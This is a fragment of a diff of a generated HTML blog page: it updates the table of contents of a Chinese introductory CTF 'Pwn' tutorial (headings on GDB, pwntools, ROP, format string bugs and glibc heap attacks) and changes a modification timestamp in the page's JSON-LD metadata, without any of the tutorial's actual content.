class="toc-text">ret2libc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81-Control-Flow-Hijack"><span class="toc-number">5.4.</span> <span class="toc-text">劫持控制流&#x2F;Control Flow Hijack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Canary"><span class="toc-number">5.5.</span> <span class="toc-text">Stack Canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-Format-String-Vulnerability"><span class="toc-number">6.</span> <span class="toc-text">格式化字符串漏洞 Format String Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%88%A9%E7%94%A8-Heap-Exploitation"><span class="toc-number">7.</span> <span class="toc-text">堆利用&#x2F;Heap Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E7%B1%BB"><span class="toc-number">8.</span> <span class="toc-text">题目分类</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%EF%BC%88Address-space%EF%BC%8CProzess-Adressraum%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">地址空间（Address space，Prozess Adressraum）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X86%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.</span> <span class="toc-text">X86汇编</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%80%A7%E6%A3%80%E6%9F%A5"><span class="toc-number">2.</span> <span class="toc-text">安全性检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GDB"><span class="toc-number">3.1.</span> <span class="toc-text">GDB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">3.1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Pwndbg"><span class="toc-number">3.1.2.</span> <span class="toc-text">安装Pwndbg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.3.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%81%8F%E7%A7%BB"><span class="toc-number">3.1.4.</span> <span class="toc-text">确定返回地址偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">3.1.5.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-Ghidra"><span class="toc-number">3.2.</span> <span class="toc-text">IDA&#x2F;Ghidra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwntools"><span class="toc-number">3.3.</span> <span class="toc-text">Pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8-API%EF%BC%88%E6%8C%89%E4%BB%BB%E5%8A%A1%E5%88%86%E7%B1%BB%EF%BC%89"><span class="toc-number">3.3.2.</span> <span class="toc-text">常用 API（按任务分类）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.3.3.</span> <span class="toc-text">模板</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ropgadget"><span class="toc-number">3.4.</span> <span class="toc-text">Ropgadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">漏洞以及利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA-Buffer-Overflow"><span class="toc-number">5.</span> <span class="toc-text">溢出 Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E-%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞&#x2F;常见危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93%E5%AD%97%E6%AE%B5%E5%8A%AB%E6%8C%81"><span class="toc-number">5.2.</span> <span class="toc-text">结构体字段劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%EF%BC%88Return-Oriented-Programming%EF%BC%89"><span class="toc-number">5.3.</span> <span class="toc-text">ROP（Return Oriented Programming）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2text"><span class="toc-number">5.3.1.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">5.3.2.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2libc"><span class="toc-number">5.3.3.</span> <span class="toc-text">ret2libc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81-Control-Flow-Hijack"><span class="toc-number">5.4.</span> <span class="toc-text">劫持控制流&#x2F;Control Flow Hijack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Canary"><span class="toc-number">5.5.</span> <span class="toc-text">Stack Canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-Format-String-Vulnerability"><span class="toc-number">6.</span> <span class="toc-text">格式化字符串漏洞 Format String Vulnerability</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="toc-number">6.1.</span> <span class="toc-text">格式化字符串函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0-1"><span class="toc-number">6.1.1.</span> <span class="toc-text">格式化字符串函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.1.2.</span> <span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">6.1.3.</span> <span class="toc-text">变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.2.</span> <span class="toc-text">格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%98%AF%E6%80%8E%E4%B9%88%E4%BC%A0%E8%BF%9B-printf-%E7%9A%84%EF%BC%8832-bit-%E5%92%8C-64-bit%EF%BC%89"><span class="toc-number">6.2.1.</span> <span class="toc-text">参数是怎么传进 printf 的（32-bit 和 64-bit）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#32-bit%EF%BC%88cdecl%EF%BC%89%E2%80%94%E2%80%94%E5%85%A8%E9%83%A8%E8%B5%B0%E6%A0%88"><span class="toc-number">6.2.1.1.</span> <span class="toc-text">32-bit（cdecl）——全部走栈</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x86-64%EF%BC%88System-V-ABI%EF%BC%89%E2%80%94%E2%80%94%E5%AF%84%E5%AD%98%E5%99%A8%E4%BC%98%E5%85%88-%E6%BA%A2%E5%87%BA%E5%88%B0%E6%A0%88"><span class="toc-number">6.2.1.2.</span> <span class="toc-text">x86-64（System V ABI）——寄存器优先 + 溢出到栈</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%E4%BB%A5%E5%8F%8A%E5%81%8F%E5%B7%AE%E5%80%BC"><span class="toc-number">6.2.2.</span> <span class="toc-text">特殊情况以及偏差值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A1%A8%E7%8E%B0"><span class="toc-number">6.2.3.</span> <span class="toc-text">漏洞表现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit%E6%8A%80%E5%B7%A7"><span class="toc-number">6.3.</span> <span class="toc-text">Exploit技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%A0%88%E4%B8%8A%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">6.3.1.</span> <span class="toc-text">读取栈上的内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.3.2.</span> <span class="toc-text">读取任意地址的字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">6.3.2.1.</span> <span class="toc-text">一般流程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5"><span class="toc-number">6.3.3.</span> <span class="toc-text">写入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B-1"><span class="toc-number">6.3.3.1.</span> <span class="toc-text">一般流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99-1-%E5%AD%97%E8%8A%82%EF%BC%88-hhn%EF%BC%89"><span class="toc-number">6.3.3.2.</span> <span class="toc-text">写 1 字节（%hhn）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fmtstr-payload"><span class="toc-number">6.3.3.3.</span> <span class="toc-text">fmtstr_payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">6.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%88%A9%E7%94%A8-Heap-Exploitation"><span class="toc-number">7.</span> <span class="toc-text">堆利用&#x2F;Heap Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Glibc-2-31"><span class="toc-number">7.0.1.</span> <span class="toc-text">Glibc 2.31</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Glibc-2-41"><span class="toc-number">7.0.2.</span> <span class="toc-text">Glibc 2.41</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">7.1.</span> <span class="toc-text">攻击方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Fastbin-Tcache-FD-Corruption-FD-%E6%8C%87%E9%92%88%E7%AF%A1%E6%94%B9"><span class="toc-number">7.1.1.</span> <span class="toc-text">1. Fastbin&#x2F;Tcache FD Corruption (FD 指针篡改)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Size-Corruption-%E5%A4%A7%E5%B0%8F%E7%AF%A1%E6%94%B9-Overlapping-Chunks"><span class="toc-number">7.1.2.</span> <span class="toc-text">2. Size Corruption (大小篡改 &#x2F; Overlapping Chunks)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Smallbin-Consolidation-Smallbin-%E5%90%88%E5%B9%B6%E6%94%BB%E5%87%BB"><span class="toc-number">7.1.3.</span> <span class="toc-text">3. Smallbin Consolidation (Smallbin 合并攻击)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A8%E8%8D%90%E5%B7%A5%E5%85%B7"><span class="toc-number">7.2.</span> <span class="toc-text">推荐工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99"><span class="toc-number">7.3.</span> <span class="toc-text">学习资料</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8pwndbg%E5%91%BD%E4%BB%A4"><span class="toc-number">7.4.</span> <span class="toc-text">常用pwndbg命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E7%B1%BB"><span class="toc-number">8.</span> <span class="toc-text">题目分类</span></a></li></ol>
   </div>
 </section>
 
@@ -3849,7 +4529,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Hexo","url":"https://archer-baiyi.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/","sameAs":["https://github.com/volantis-x"],"description":"hi"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://archer-baiyi.github.io/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"https://archer-baiyi.github.io/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":2,"item":{"@id":"https://archer-baiyi.github.io/categories/CTF/Pwn/","name":"Pwn"}},{"@type":"ListItem","position":3,"item":{"@id":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/Pwn入门/","name":"Pwn入门"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Hexo","url":"https://archer-baiyi.github.io/","keywords":null,"description":"hi","author":{"@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/","description":"hi"},"publisher":{"@type":"Organization","name":"Hexo","url":"https://archer-baiyi.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://archer-baiyi.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"Pwn入门","description":"零基础Pwn入门","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/"},"author":{"@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/","wordCount":8,"datePublished":"2025-05-12T15:01:08.000Z","dateModified":"2025-12-20T23:58:59.714Z","articleSection":"CTF","keywords":"Pwn","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Hexo","url":"https://archer-baiyi.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/","sameAs":["https://github.com/volantis-x"],"description":"hi"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://archer-baiyi.github.io/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"https://archer-baiyi.github.io/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":2,"item":{"@id":"https://archer-baiyi.github.io/categories/CTF/Pwn/","name":"Pwn"}},{"@type":"ListItem","position":3,"item":{"@id":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/Pwn入门/","name":"Pwn入门"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Hexo","url":"https://archer-baiyi.github.io/","keywords":null,"description":"hi","author":{"@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/","description":"hi"},"publisher":{"@type":"Organization","name":"Hexo","url":"https://archer-baiyi.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://archer-baiyi.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"Pwn入门","description":"零基础Pwn入门","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/"},"author":{"@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/","wordCount":8,"datePublished":"2025-05-12T15:01:08.000Z","dateModified":"2025-12-21T11:01:39.138Z","articleSection":"CTF","keywords":"Pwn","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
